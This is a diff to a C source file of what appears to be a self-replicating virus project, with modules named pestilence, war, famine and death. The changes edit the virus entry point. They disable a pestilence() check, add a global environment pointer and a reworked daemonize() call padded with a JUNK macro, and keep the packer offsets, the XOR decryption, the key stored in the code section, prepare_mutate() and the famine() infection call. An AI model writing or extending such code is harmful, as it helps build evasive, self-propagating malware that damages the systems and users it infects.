@@ -12,7 +12,7 @@
 #include "text.h"
 #include "pestilence.h"
 #include "war.h"
-#include "daemon.h"
+//#include "daemon.h"
 #include "famine.h"
 #include "death.h"
 #include "syscall.h"
@@ -30,6 +30,7 @@
 #define PACKER_SIZE (uintptr_t)&real_start - (uintptr_t)&_start
 
 extern void end(void);
+extern int daemonize(void);
 
 void	famine(bootstrap_data_t *bootstrap_data, uint16_t *counter);
 void	jmp_end(void);
@@ -70,10 +71,11 @@ char __attribute__((section(".text#"))) g_signature[SIGNATURE_SIZE] = \
 
 //int64_t __attribute__((section(".text#"))) g_key = 0x0;
 
-uint8_t __attribute__((section(".text#"))) g_key[KEY_SIZE] = {0};
-bool __attribute__((section(".text#"))) g_is_encrypted = false;
+uint8_t __attribute__((section(".text#")))	g_key[KEY_SIZE] = {0};
+bool __attribute__((section(".text#")))	    g_is_encrypted = false;
 
-int __attribute__((section(".text#"))) g_start_offset = 0x1000;
+int __attribute__((section(".text#")))	    g_start_offset = 0x1000;
+char __attribute__((section(".text#")))	    **g_envp;
 
 static void xor_decrypt(uint8_t *data, const size_t size, uint8_t *key)
 {
@@ -298,7 +300,8 @@ void	entrypoint(int argc, char **argv, char **envp)
 	file_t file;
 	ft_memset(&file, 0, sizeof(file_t));
 
-	if (pestilence() != 0) return ;
+
+	//if (pestilence() != 0) return ;
 
 	/* saving these values (they will be overwritten by the packer) */
 	uint8_t key[KEY_SIZE];
@@ -313,7 +316,8 @@ void	entrypoint(int argc, char **argv, char **envp)
 
 	prepare_mutate();
 
-	daemonize(envp);
+	g_envp = bootstrap_data.envp;
+	daemonize(); JUNK;
 
 	famine(&bootstrap_data, &counter);
 
